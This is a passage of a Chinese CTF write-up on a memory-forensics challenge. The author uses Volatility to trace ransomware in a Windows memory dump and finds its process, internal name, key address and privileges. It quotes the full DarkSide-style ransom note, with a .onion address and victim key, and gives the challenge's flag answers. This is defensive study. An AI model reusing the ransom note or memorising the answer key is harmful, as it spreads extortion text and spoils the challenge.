\u5f15\u64ce\u7248\u672c: 1.1.24090.11\\n```\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n2147729928\\n```\\n\\n## \u5a01\u80c1\u5206\u6790 - 03\\n\\n> \u4e86\u89e3\u6076\u610f\u8f6f\u4ef6\u7684\u5185\u90e8\u540d\u79f0\uff08\u5982\u5f00\u53d1\u8005\u7ed9\u5b83\u7684\u547d\u540d\uff09\u6709\u52a9\u4e8e\u8bc6\u522b\u5176\u5bb6\u65cf\u3001\u7248\u672c\u548c\u7279\u5b9a\u529f\u80fd\uff0c\u8fdb\u800c\u5236\u5b9a\u6709\u6548\u7684\u9632\u5fa1\u7b56\u7565\u3002\\n>\\n> \u8bf7\u95ee\uff0c\u7cfb\u7edf\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u6076\u610f\u8f6f\u4ef6\u7684\u5185\u90e8\u540d\u79f0\u662f\u4ec0\u4e48\uff1f\uff08\u8bf7\u5c06\u7b54\u6848\u7f16\u8f91\u5e76\u5b58\u5165 `/opt/wxfx/answer/3.txt` \u6587\u4ef6\u4e2d\uff0c\u53c2\u8003 `/opt/wxfx/example` \u76ee\u5f55\uff09\\n\\n### \u601d\u8def\u4e00 \u57fa\u4e8e\u5e38\u89c1\u5173\u952e\u8bcd\u8fdb\u884c\u5b9a\u4f4d\\n\\n\u5bf9\u5185\u5b58\u955c\u50cf\u7684 Strings \u8fdb\u884c\u5206\u6790\uff0c\u7ecf\u8fc7\u5e38\u89c1\u6076\u610f\u7a0b\u5e8f\u7684\u5173\u952e\u8bcd\u5339\u914d\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u5185\u5b58\u4e2d\u7684\u4ee5\u4e0b\u90e8\u5206\\n\\n![img](img/image_20241226-122607.png)\\n\\n```plaintext\\n<------------- [ Welcome to DarkSide] -------------\x3e\\n\\n What happend?\\n ----------------------------------------------\\n Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data.\\n But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network.\\n Follow our instructions below and you will recover all your data.\\n\\n What guarantees?\\n ----------------------------------------------\\n We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.\\n All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.\\n We guarantee to decrypt one file for free. Go to the site and contact us.\\n\\n How to get access on website?\\n ----------------------------------------------\\n Using a TOR browser:\\n 1) Download and install TOR browser from this site: https://torproject.org/\\n 2) Open our website: http://darksidfqzcuhtk2.onion/GM0CG8TNZ83ZPUD15TL76BLDCG0ST24TR6NXG1J2AVXSKF8KS4KFIIN2ON5GRWD4\\n\\n When you open our website, put the following data in the input form:\\n Key:\\n\\n lsJTyyTnzJlGQ1I6sfwV6oVcXaRynwN6mWphA7BKXEDIHJcDlhNNHsrxlkpggRChK2nQ7wP0sknJvl37lbqElTopkUywK3QnfJFmqDBSCmFISeWSudjgwxB4kKSp7h4VySHeu4LmDiZXTAh1dbZHWxTtZ0bA6PhCoDrbGkctY4rucITW4IdYUZJC8d2B7SFnr5EA7EoRkajrZW54brM5Kgwqsz67qzH6Hk0Vr3EDcnGzNjGQBapJczIWkgPtMCJdTkeemQ34XH7wawXu3eOGV3uJlBZNoSuaxtDHMGApS8EWsUXhafMW8WxFLAPLCo6pdm7MLcLsVDp9iBXU1sLv2KkGyUJbO0KOmom9f1JREuidviHRfsndEgMFBAjyq5v4VEIraiioAbtWM7eecYaXPVt3rolsBi8mtjxLOpFj73NPPitoIDxBNfHGzXxvRTXi06Pjx9pRnAtjIqoq5wovnHa8uBel8nq8yDJTk7NWdGdsv3yVwV2TmBin7OvFqHN9lweFNJyuziKCVGEtSaglUNudMmpFnNObGlhfh58jQsrQiQZ2d3AOFsi\\n\\n !!! DANGER !!!\\n DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.\\n !!! DANGER !!!\\n```\\n\\n\u57fa\u4e8e\u5df2\u77e5\u660e\u6587\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u76f8\u5173\u8fdb\u7a0b\\n\\n```plaintext\\nPS D:\\\\Downloads\\\\attachment\\\\attachment> .\\\\volatility_2.6_win64_standalone.exe -f .\\\\dump.mem --profile=Win10x64_14393 yarascan -Y \\"Your computers and servers are encrypted\\"\\nVolatility Foundation Volatility Framework 2.6\\nRule: r1\\nOwner: Process SearchProtocol Pid 4036\\n0x2079976dcc5  59 6f 75 72 20 63 6f 6d 70 75 74 65 72 73 20 61   Your.computers.a\\n0x2079976dcd5  6e 64 20 73 65 72 76 65 72 73 20 61 72 65 20 65   nd.servers.are.e\\n0x2079976dce5  6e 63 72 79 70 74 65 64 2c 20 62 61 63 6b 75 70   ncrypted,.backup\\n0x2079976dcf5  73 20 61 72 65 20 64 65 6c 65 74 65 64 2e 20 57   s.are.deleted..W\\n0x2079976dd05  65 20 75 73 65 20 73 74 72 6f 6e 67 20 65 6e 63   e.use.strong.enc\\n0x2079976dd15  72 79 70 74 69 6f 6e 20 61 6c 67 6f 72 69 74 68   ryption.algorith\\n0x2079976dd25  6d 73 2c 20 73 6f 20 79 6f 75 20 63 61 6e 6e 6f   ms,.so.you.canno\\n0x2079976dd35  74 20 64 65 63 72 79 70 74 20 79 6f 75 72 20 64   t.decrypt.your.d\\n0x2079976dd45  61 74 61 2e 20 0d 0a 20 42 75 74 20 79 6f 75 20   ata.....But.you.\\n0x2079976dd55  63 61 6e 20 72 65 73 74 6f 72 65 20 65 76 65 72   can.restore.ever\\n0x2079976dd65  79 74 68 69 6e 67 20 62 79 20 70 75 72 63 68 61   ything.by.purcha\\n0x2079976dd75  73 69 6e 67 20 61 20 73 70 65 63 69 61 6c 20 70   sing.a.special.p\\n0x2079976dd85  72 6f 67 72 61 6d 20 66 72 6f 6d 20 75 73 20 2d   rogram.from.us.-\\n0x2079976dd95  20 75 6e 69 76 65 72 73 61 6c 20 64 65 63 72 79   .universal.decry\\n0x2079976dda5  70 74 6f 72 2e 20 54 68 69 73 20 70 72 6f 67 72   ptor..This.progr\\n0x2079976ddb5  61 6d 20 77 69 6c 6c 20 72 65 73 74 6f 72 65 20   am.will.restore.\\nRule: r1\\nOwner: Process SearchProtocol Pid 4036\\n0x2079977314d  59 6f 75 72 20 63 6f 6d 70 75 74 65 72 73 20 61   Your.computers.a\\n0x2079977315d  6e 64 20 73 65 72 76 65 72 73 20 61 72 65 20 65   nd.servers.are.e\\n0x2079977316d  6e 63 72 79 70 74 65 64 2c 20 62 61 63 6b 75 70   ncrypted,.backup\\n0x2079977317d  73 20 61 72 65 20 64 65 6c 65 74 65 64 2e 20 57   s.are.deleted..W\\n0x2079977318d  65 20 75 73 65 20 73 74 72 6f 6e 67 20 65 6e 63   e.use.strong.enc\\n0x2079977319d  72 79 70 74 69 6f 6e 20 61 6c 67 6f 72 69 74 68   ryption.algorith\\n0x207997731ad  6d 73 2c 20 73 6f 20 79 6f 75 20 63 61 6e 6e 6f   ms,.so.you.canno\\n0x207997731bd  74 20 64 65 63 72 79 70 74 20 79 6f 75 72 20 64   t.decrypt.your.d\\n0x207997731cd  61 74 61 2e 20 0d 0a 20 42 75 74 20 79 6f 75 20   ata.....But.you.\\n0x207997731dd  63 61 6e 20 72 65 73 74 6f 72 65 20 65 76 65 72   can.restore.ever\\n0x207997731ed  79 74 68 69 6e 67 20 62 79 20 70 75 72 63 68 61   ything.by.purcha\\n0x207997731fd  73 69 6e 67 20 61 20 73 70 65 63 69 61 6c 20 70   sing.a.special.p\\n0x2079977320d  72 6f 67 72 61 6d 20 66 72 6f 6d 20 75 73 20 2d   rogram.from.us.-\\n0x2079977321d  20 75 6e 69 76 65 72 73 61 6c 20 64 65 63 72 79   .universal.decry\\n0x2079977322d  70 74 6f 72 2e 20 54 68 69 73 20 70 72 6f 67 72   ptor..This.progr\\n0x2079977323d  61 6d 20 77 69 6c 6c 20 72 65 73 74 6f 72 65 20   am.will.restore.\\nRule: r1\\nOwner: Process svchost.exe Pid 5784\\n0x00d1a10d  59 6f 75 72 20 63 6f 6d 70 75 74 65 72 73 20 61   Your.computers.a\\n0x00d1a11d  6e 64 20 73 65 72 76 65 72 73 20 61 72 65 20 65   nd.servers.are.e\\n0x00d1a12d  6e 63 72 79 70 74 65 64 2c 20 62 61 63 6b 75 70   ncrypted,.backup\\n0x00d1a13d  73 20 61 72 65 20 64 65 6c 65 74 65 64 2e 20 57   s.are.deleted..W\\n0x00d1a14d  65 20 75 73 65 20 73 74 72 6f 6e 67 20 65 6e 63   e.use.strong.enc\\n0x00d1a15d  72 79 70 74 69 6f 6e 20 61 6c 67 6f 72 69 74 68   ryption.algorith\\n0x00d1a16d  6d 73 2c 20 73 6f 20 79 6f 75 20 63 61 6e 6e 6f   ms,.so.you.canno\\n0x00d1a17d  74 20 64 65 63 72 79 70 74 20 79 6f 75 72 20 64   t.decrypt.your.d\\n0x00d1a18d  61 74 61 2e 20 0d 0a 20 42 75 74 20 79 6f 75 20   ata.....But.you.\\n0x00d1a19d  63 61 6e 20 72 65 73 74 6f 72 65 20 65 76 65 72   can.restore.ever\\n0x00d1a1ad  79 74 68 69 6e 67 20 62 79 20 70 75 72 63 68 61   ything.by.purcha\\n0x00d1a1bd  73 69 6e 67 20 61 20 73 70 65 63 69 61 6c 20 70   sing.a.special.p\\n0x00d1a1cd  72 6f 67 72 61 6d 20 66 72 6f 6d 20 75 73 20 2d   rogram.from.us.-\\n0x00d1a1dd  20 75 6e 69 76 65 72 73 61 6c 20 64 65 63 72 79   .universal.decry\\n0x00d1a1ed  70 74 6f 72 2e 20 54 68 69 73 20 70 72 6f 67 72   ptor..This.progr\\n0x00d1a1fd  61 6d 20 77 69 6c 6c 20 72 65 73 74 6f 72 65 20   am.will.restore.\\n```\\n\\n\u6392\u9664\u6389\u6b63\u5e38\u7cfb\u7edf\u670d\u52a1\uff0c\u5373\u53ef\u786e\u5b9a\u5230 `Process svchost.exe Pid 5784` \u4e3a\u6076\u610f\u8fdb\u7a0b\\n\\n### \u601d\u8def\u4e8c \u5bf9\u78c1\u76d8\u975e\u5e38\u89c4\u6587\u4ef6\u8fdb\u884c\u6392\u67e5\\n\\n\u4f7f\u7528 `R-Studio` \u5bf9\u5185\u5b58\u4e2d\u7684 NTFS \u7ed3\u6784\u6570\u636e\u5e93\u8fdb\u884c\u5206\u6790\uff0c\u627e\u5230 `F:\\\\Users\\\\skills\\\\svchost.exe`\\n\\n![img](img/image_20241231-123152.png)\\n\\n\u5e38\u89c4\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6 `svchost.exe` \u4e0d\u4f1a\u5b58\u5728\u4e8e\u7528\u6237\u76ee\u5f55\u4e2d\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e3a\u53ef\u7591\u6587\u4ef6\\n\\n### \u601d\u8def\u4e09 \u4f7f\u7528 Yara \u8fdb\u884c\u5339\u914d\u5206\u6790\\n\\n[MemProcFS](https://github.com/ufrisk/MemProcFS) \u81ea\u5e26\u4e86\u4e00\u4efd Malware Yara \u5339\u914d\u89c4\u5219\u8868\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\\n\\n![img](img/image_20241201-130121.png)\\n\\nVolatility \u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528 [Simple python script for merging malware yara rules from https://github.com/Yara-Rules/rules](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9) \u5c06 Yara \u5b98\u65b9\u89c4\u5219\u5e93\uff0c\u4ee5\u53ca\u4e00\u4e9b\u589e\u5f3a\u578b Yara \u89c4\u5219\u5e93\uff0c\u8fdb\u884c\u5408\u5e76\u4e4b\u540e\u8fdb\u884c\u52a0\u8f7d\uff0c\u4e5f\u53ef\u4ee5\u5b9a\u4f4d\u5230\u6076\u610f\u8fdb\u7a0b\\n\\n\u7efc\u4e0a\uff0c\u90fd\u53ef\u4ee5\u5b9a\u4f4d\u5230\u6076\u610f\u8f6f\u4ef6\u7684\u4fe1\u606f\uff0c\u5176\u6587\u4ef6\u8def\u5f84\u4e3a `F:\\\\Users\\\\skills\\\\svchost.exe` \u8fdb\u7a0b\u4fe1\u606f\u4e3a `Process svchost.exe Pid 5784`\\n\\n\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u8fdb\u884c\u63d0\u53d6\\n\\n```bash\\nPS D:\\\\Downloads\\\\attachment\\\\attachment> .\\\\volatility_2.6_win64_standalone.exe -f .\\\\dump.mem --profile=Win10x64_14393 dumpfiles --regex \\"skills\\\\\\\\svchost\\\\.exe\\" -D .\\nVolatility Foundation Volatility Framework 2.6\\nImageSectionObject 0xffff9a88056a9ef0   5784   \\\\Device\\\\HarddiskVolume3\\\\Users\\\\skills\\\\svchost.exe\\nDataSectionObject 0xffff9a88056a9ef0   5784   \\\\Device\\\\HarddiskVolume3\\\\Users\\\\skills\\\\svchost.exe\\n```\\n\\n\u53ef\u4ee5\u5f97\u5230\u6587\u4ef6 `file.5784.0xffff9a8805ed2010.dat`\\n\\n\u5bf9 `file.5784.0xffff9a8805ed2010.dat` \u67e5\u770b\u5176 PE \u6587\u4ef6\u4fe1\u606f\\n\\n![img](img/image_20241235-143503.png)\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\ncalimalimodumator.exe\\n```\\n\\n## \u5a01\u80c1\u5206\u6790 - 04\\n\\n> \u9006\u5411\u5206\u6790\u6076\u610f\u8f6f\u4ef6\u65f6\uff0c\u786e\u5b9a\u5176\u5728\u8fdb\u7a0b\u5185\u5b58\u4e2d\u5b58\u50a8\u5173\u952e\u6570\u636e\u7684\u4f4d\u7f6e\uff0c\u5bf9\u4e8e\u7406\u89e3\u5176\u5de5\u4f5c\u673a\u5236\u548c\u9632\u8303\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u975e\u5e38\u91cd\u8981\u3002\\n>\\n> \u8bf7\u95ee\uff0c\u6076\u610f\u8f6f\u4ef6\u5728\u8fdb\u7a0b\u5185\u5b58\u4e2d\u5b58\u50a8\u5bc6\u94a5\u7684\u5185\u5b58\u5730\u5740\u662f\u4ec0\u4e48\uff1f\uff08\u8bf7\u5c06\u7b54\u6848\u7f16\u8f91\u5e76\u5b58\u5165 `/opt/wxfx/answer/4.txt` \u6587\u4ef6\u4e2d\uff0c\u53c2\u8003 `/opt/wxfx/example` \u76ee\u5f55\uff09\\n\\n\u5728\u4e0a\u6587\u4e2d\uff0c\u5df2\u7ecf\u5728\u5185\u5b58\u4e2d\u627e\u5230\u4e86\u6076\u610f\u8f6f\u4ef6\u7684\u52d2\u7d22\u4fe1\u606f\\n\\n```plaintext\\nWhen you open our website, put the following data in the input form:\\nKey:\\n\\nlsJTyyTnzJlGQ1I6sfwV6oVcXaRynwN6mWphA7BKXEDIHJcDlhNNHsrxlkpggRChK2nQ7wP0sknJvl37lbqElTopkUywK3QnfJFmqDBSCmFISeWSudjgwxB4kKSp7h4VySHeu4LmDiZXTAh1dbZHWxTtZ0bA6PhCoDrbGkctY4rucITW4IdYUZJC8d2B7SFnr5EA7EoRkajrZW54brM5Kgwqsz67qzH6Hk0Vr3EDcnGzNjGQBapJczIWkgPtMCJdTkeemQ34XH7wawXu3eOGV3uJlBZNoSuaxtDHMGApS8EWsUXhafMW8WxFLAPLCo6pdm7MLcLsVDp9iBXU1sLv2KkGyUJbO0KOmom9f1JREuidviHRfsndEgMFBAjyq5v4VEIraiioAbtWM7eecYaXPVt3rolsBi8mtjxLOpFj73NPPitoIDxBNfHGzXxvRTXi06Pjx9pRnAtjIqoq5wovnHa8uBel8nq8yDJTk7NWdGdsv3yVwV2TmBin7OvFqHN9lweFNJyuziKCVGEtSaglUNudMmpFnNObGlhfh58jQsrQiQZ2d3AOFsi\\n```\\n\\n\u4f7f\u7528 `yarascan` \u8fdb\u884c\u68c0\u7d22\\n\\n```bash\\nPS D:\\\\Downloads\\\\attachment\\\\attachment> .\\\\volatility_2.6_win64_standalone.exe -f .\\\\dump.mem --profile=Win10x64_14393 yarascan -Y \\"lsJTyyTnzJlGQ\\"\\nVolatility Foundation Volatility Framework 2.6\\n\\n......\\nRule: r1\\nOwner: Process svchost.exe Pid 5784\\n0x00d1a585  6c 73 4a 54 79 79 54 6e 7a 4a 6c 47 51 31 49 36   lsJTyyTnzJlGQ1I6\\n0x00d1a595  73 66 77 56 36 6f 56 63 58 61 52 79 6e 77 4e 36   sfwV6oVcXaRynwN6\\n0x00d1a5a5  6d 57 70 68 41 37 42 4b 58 45 44 49 48 4a 63 44   mWphA7BKXEDIHJcD\\n0x00d1a5b5  6c 68 4e 4e 48 73 72 78 6c 6b 70 67 67 52 43 68   lhNNHsrxlkpggRCh\\n0x00d1a5c5  4b 32 6e 51 37 77 50 30 73 6b 6e 4a 76 6c 33 37   K2nQ7wP0sknJvl37\\n0x00d1a5d5  6c 62 71 45 6c 54 6f 70 6b 55 79 77 4b 33 51 6e   lbqElTopkUywK3Qn\\n0x00d1a5e5  66 4a 46 6d 71 44 42 53 43 6d 46 49 53 65 57 53   fJFmqDBSCmFISeWS\\n0x00d1a5f5  75 64 6a 67 77 78 42 34 6b 4b 53 70 37 68 34 56   udjgwxB4kKSp7h4V\\n0x00d1a605  79 53 48 65 75 34 4c 6d 44 69 5a 58 54 41 68 31   ySHeu4LmDiZXTAh1\\n0x00d1a615  64 62 5a 48 57 78 54 74 5a 30 62 41 36 50 68 43   dbZHWxTtZ0bA6PhC\\n0x00d1a625  6f 44 72 62 47 6b 63 74 59 34 72 75 63 49 54 57   oDrbGkctY4rucITW\\n0x00d1a635  34 49 64 59 55 5a 4a 43 38 64 32 42 37 53 46 6e   4IdYUZJC8d2B7SFn\\n0x00d1a645  72 35 45 41 37 45 6f 52 6b 61 6a 72 5a 57 35 34   r5EA7EoRkajrZW54\\n0x00d1a655  62 72 4d 35 4b 67 77 71 73 7a 36 37 71 7a 48 36   brM5Kgwqsz67qzH6\\n0x00d1a665  48 6b 30 56 72 33 45 44 63 6e 47 7a 4e 6a 47 51   Hk0Vr3EDcnGzNjGQ\\n0x00d1a675  42 61 70 4a 63 7a 49 57 6b 67 50 74 4d 43 4a 64   BapJczIWkgPtMCJd\\n```\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n0x00d1a585\\n```\\n\\n## \u5a01\u80c1\u5206\u6790 - 05\\n\\n> \u5206\u6790\u6076\u610f\u8f6f\u4ef6\u7684\u884c\u4e3a\u5305\u62ec\u4e86\u89e3\u5176\u5728\u7cfb\u7edf\u4e2d\u542f\u7528\u4e86\u54ea\u4e9b\u6743\u9650\uff0c\u8fd9\u6709\u52a9\u4e8e\u8bc4\u4f30\u5176\u6f5c\u5728\u7684\u5371\u5bb3\u548c\u653b\u51fb\u8303\u56f4\u3002\u901a\u8fc7\u68c0\u67e5\u8fdb\u7a0b\u7684\u6743\u9650\u5217\u8868\uff0c\u53ef\u4ee5\u53d1\u73b0\u5176\u53ef\u80fd\u6267\u884c\u7684\u654f\u611f\u64cd\u4f5c\u3002\\n>\\n> \u8bf7\u95ee\uff0c\u6076\u610f\u8f6f\u4ef6\u5728\u5176\u8fdb\u7a0b\u4e2d\u542f\u7528\u4e86\u591a\u5c11\u4e2a\u6743\u9650\uff1f\uff08\u8bf7\u5c06\u7b54\u6848\u7f16\u8f91\u5e76\u5b58\u5165 `/opt/wxfx/answer/5.txt` \u6587\u4ef6\u4e2d\uff0c\u53c2\u8003 `/opt/wxfx/example` \u76ee\u5f55\uff09\\n\\n\u5df2\u77e5\u6076\u610f\u7a0b\u5e8f\u7684\u8fdb\u7a0b\u4fe1\u606f\u4e3a `Process svchost.exe Pid 5784` \u7684\u60c5\u51b5\u4e0b\uff0c\u67e5\u770b\u8fdb\u7a0b\u6743\u9650\u4fe1\u606f\\n\\n```bash\\nPS D:\\\\Downloads\\\\attachment\\\\attachment> .\\\\volatility_2.6_win64_standalone.exe -f .\\\\dump.mem --profile=Win10x64_14393 privs -p 5784\\nVolatility Foundation Volatility Framework 2.6\\nPid      Process          Value  Privilege                            Attributes               Description\\n-------- ---------------- ------ ------------------------------------ ------------------------ -----------\\n    5784 svchost.exe           2 SeCreateTokenPrivilege                                        Create a token object\\n    5784 svchost.exe           3 SeAssignPrimaryTokenPrivilege                                 Replace a process-level token\\n    5784 svchost.exe           4 SeLockMemoryPrivilege                                         Lock pages in memory\\n    5784 svchost.exe           5 SeIncreaseQuotaPrivilege             Present,Enabled          Increase quotas\\n    5784 svchost.exe           6 SeMachineAccountPrivilege                                     Add workstations to the domain\\n    5784 svchost.exe           7 SeTcbPrivilege                                                Act as part of the operating system\\n    5784 svchost.exe           8 SeSecurityPrivilege                  Present,Enabled          Manage auditing and security log\\n    5784 svchost.exe           9 SeTakeOwnershipPrivilege             Present,Enabled          Take ownership of files/objects\\n    5784 svchost.exe          10 SeLoadDriverPrivilege                Present,Enabled          Load and unload device drivers\\n    5784 svchost.exe          11 SeSystemProfilePrivilege             Present,Enabled          Profile system performance\\n    5784 svchost.exe          12 SeSystemtimePrivilege                Present,Enabled          Change the system time\\n    5784 svchost.exe          13 SeProfileSingleProcessPrivilege      Present,Enabled          Profile a single process\\n    5784 svchost.exe          14 SeIncreaseBasePriorityPrivilege      Present,Enabled          Increase scheduling priority\\n    5784 svchost.exe          15 SeCreatePagefilePrivilege            Present,Enabled          Create a pagefile\\n    5784 svchost.exe          16 SeCreatePermanentPrivilege                                    Create permanent shared objects\\n    5784 svchost.exe          17 SeBackupPrivilege                    Present,Enabled          Backup files and directories\\n    5784 svchost.exe          18 SeRestorePrivilege                   Present,Enabled          Restore files and directories\\n    5784 svchost.exe          19 SeShutdownPrivilege                  Present,Enabled          Shut down the system\\n    5784 svchost.exe          20 SeDebugPrivilege                     Present,Enabled          Debug programs\\n    5784 svchost.exe          21 SeAuditPrivilege                                              Generate security audits\\n    5784 svchost.exe          22 SeSystemEnvironmentPrivilege         Present,Enabled          Edit firmware environment values\\n    5784 svchost.exe          23 SeChangeNotifyPrivilege              Present,Enabled,Default  Receive notifications of changes to files or directories\\n    5784 svchost.exe          24 SeRemoteShutdownPrivilege            Present,Enabled          Force shutdown from a remote system\\n    5784 svchost.exe          25 SeUndockPrivilege                    Present,Enabled          Remove computer from docking station\\n    5784 svchost.exe          26 SeSyncAgentPrivilege                                          Synch directory service data\\n    5784 svchost.exe          27 SeEnableDelegationPrivilege                                   Enable user accounts to be trusted for delegation\\n    5784 svchost.exe          28 SeManageVolumePrivilege              Present,Enabled          Manage the files on a volume\\n    5784 svchost.exe          29 SeImpersonatePrivilege               Present,Enabled,Default  Impersonate a client after authentication\\n    5784 svchost.exe          30 SeCreateGlobalPrivilege              Present,Enabled,Default  Create global objects\\n    5784 svchost.exe          31 SeTrustedCredManAccessPrivilege                               Access Credential Manager as a trusted caller\\n    5784 svchost.exe          32 SeRelabelPrivilege                                            Modify the mandatory integrity level of an object\\n    5784 svchost.exe          33 SeIncreaseWorkingSetPrivilege        Present,Enabled          Allocate more memory for user applications\\n    5784 svchost.exe          34 SeTimeZonePrivilege                  Present,Enabled          Adjust the time zone of the computer\'s internal clock\\n    5784 svchost.exe          35 SeCreateSymbolicLinkPrivilege        Present,Enabled          Required to create a symbolic link\\n```\\n\\n\u5bf9 `Attributes` \u4e3a `Enabled` \u7684\u6743\u9650\u8fdb\u884c\u7b5b\u9009\u7edf\u8ba1\uff0c\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n23\\n```\\n\\n## \u5a01\u80c1\u5206\u6790 - 06\\n\\n> \u5728\u5206\u6790\u52d2\u7d22\u8f6f\u4ef6\u7684\u884c\u4e3a\u65f6\uff0c\u786e\u5b9a\u5176\u5728\u5185\u5b58\u4e2d\u52a0\u8f7d\u7684\u4f4d\u7f6e\u5bf9\u4e8e\u6df1\u5165\u7406\u89e3\u5176\u8fd0\u884c\u673a\u5236\u548c\u53d1\u73b0\u6f5c\u5728\u7684\u6f0f\u6d1e\u975e\u5e38\u91cd\u8981\u3002\u901a\u8fc7\u5185\u5b58\u53d6\u8bc1\uff0c\u53ef\u4ee5\u627e\u5230\u6253\u5f00\u52d2\u7d22\u8f6f\u4ef6\u6587\u4ef6\u7684\u8bbe\u5907\u7684\u865a\u62df\u5730\u5740\u3002\\n>\\n> \u8bf7\u95ee\uff0c\u6253\u5f00\u52d2\u7d22\u8f6f\u4ef6\u6587\u4ef6\u7684\u8bbe\u5907\u7684\u865a\u62df\u5730\u5740\u662f\u4ec0\u4e48\uff0816 \u8fdb\u5236\uff09\uff1f\uff08\u8bf7\u5c06\u7b54\u6848\u7f16\u8f91\u5e76\u5b58\u5165 `/opt/wxfx/answer/6.txt` \u6587\u4ef6\u4e2d\uff0c\u53c2\u8003 `/opt/wxfx/example` \u76ee\u5f55\uff09\\n\\n\u5728\u4e0a\u6587\u4e2d\uff0c\u5df2\u7ecf\u786e\u8ba4\u4e86\u6076\u610f\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u5730\u5740 `0xffff9a88056a9ef0`\\n\\n```bash\\nPS D:\\\\Downloads\\\\attachment\\\\attachment> .\\\\volatility_2.6_win64_standalone.exe -f .\\\\dump.mem --profile=Win10x64_14393 dumpfiles --regex \\"skills\\\\\\\\svchost\\\\.exe\\" -D .\\nVolatility Foundation Volatility Framework 2.6\\nImageSectionObject 0xffff9a88056a9ef0   5784   \\\\Device\\\\HarddiskVolume3\\\\Users\\\\skills\\\\svchost.exe\\nDataSectionObject 0xffff9a88056a9ef0   5784   \\\\Device\\\\HarddiskVolume3\\\\Users\\\\skills\\\\svchost.exe\\n```\\n\\n\u8fdb\u5165 `volshell` \u8fdb\u884c\u5206\u6790\\n\\n```bash\\nPS D:\\\\Downloads\\\\attachment\\\\attachment> .\\\\volatility_2.6_win64_standalone.exe -f .\\\\dump.mem --profile=Win10x64_14393 volshell -p 5784\\nVolatility Foundation Volatility Framework 2.6\\nCurrent context: svchost.exe @ 0xffff9a8805cfb4c0, pid=5784, ppid=7136 DTB=0x30400000\\nWelcome to volshell! Current memory image is:\\nfile:///D:/Downloads/attachment/attachment/dump.mem\\nTo get help, type \'hh()\'\\n>>> dt(\'_FILE_OBJECT\',0xffff9a88056a9ef0)\\n[_FILE_OBJECT _FILE_OBJECT] @ 0xFFFF9A88056A9EF0\\n0x0   : Type                           5\\n0x2   : Size                           216\\n0x8   : DeviceObject                   18446632507711949952\\n0x10  : Vpb                            18446632507711953536\\n0x18  : FsContext                      18446651757703889232\\n0x20  : FsContext2                     18446651757801468480\\n0x28  : SectionObjectPointer           18446632507741760728\\n0x30  : PrivateCacheMap                0\\n0x38  : FinalStatus                    0\\n0x40  : RelatedFileObject              0\\n0x48  : LockOperation                  0\\n0x49  : DeletePending                  0\\n0x4a  : ReadAccess                     1\\n0x4b  : WriteAccess                    0\\n0x4c  : DeleteAccess                   0\\n0x4d  : SharedRead                     1\\n0x4e  : SharedWrite                    0\\n0x4f  : SharedDelete                   1\\n0x50  : Flags                          278594\\n0x58  : FileName                       \\\\Users\\\\skills\\\\svchost.exe\\n0x68  : CurrentByteOffset              18446632507729944408\\n0x70  : Waiters                        0\\n0x74  : Busy                           0\\n0x78  : LastLock                       0\\n0x80  : Lock                           18446632507729944432\\n0x98  : Event                          18446632507729944456\\n0xb0  : CompletionContext              0\\n0xb8  : IrpListLock                    0\\n0xc0  : IrpList                        18446632507729944496\\n0xd0  : FileObjectExtension            0\\n>>> hex(18446632507711949952)\\n\'0xffff9a8804580c80L\'\\n```\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n0xffff9a8804580c80\\n```"},{"id":"2024qwbs8 Master of DFIR","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024qwbs8 Master of DFIR","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-11-12-qwbs8-Master-of-DFIR/index.md","source":"@site/blog/2024-11-12-qwbs8-Master-of-DFIR/index.md","title":"2024 \u5f3a\u7f51\u676f Master of DFIR","description":"2024 \u5f3a\u7f51\u676f Master of DFIR \u7cfb\u5217 \u9898\u76ee\u5206\u6790","date":"2024-11-12T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":25.985,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024qwbs8 Master of DFIR","title":"2024 \u5f3a\u7f51\u676f Master of DFIR","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2024 \u7f51\u9f0e\u676f \u534a\u51b3\u8d5b \u5b89\u5168\u8fd0\u8425\u6311\u6218\u8d5b \u5a01\u80c1\u5206\u6790","permalink":"/Target-Machines-WriteUp/blog/2024wdb-Semis IncidentResponse-threat analysis"},"nextItem":{"title":"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd","permalink":"/Target-Machines-WriteUp/blog/2024sxb Scenario-Race Data-Backup"}},"content":"2024 \u5f3a\u7f51\u676f Master of DFIR \u7cfb\u5217 \u9898\u76ee\u5206\u6790\\n\\n- Master of DFIR - Phishing\\n- Master of DFIR - Coffee\\n\\n\x3c!-- truncate 